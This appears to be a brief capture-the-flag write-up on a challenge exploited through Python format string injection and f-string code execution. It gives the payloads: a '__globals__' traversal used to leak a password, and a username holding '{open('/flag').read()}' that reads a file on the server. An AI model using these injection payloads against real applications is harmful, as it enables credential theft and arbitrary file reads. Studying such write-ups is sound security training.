This was a combination of format string vulnerabilities and getting code execution via [PEP 498](https://www.python.org/dev/peps/pep-0498/)

2 format string vulns
first: {rating} to find user
use first primitive to expand to {rating[comments][0].__init__.__globals__}
find password, demidog:princesses_password
make new user {open('/flag').read()}
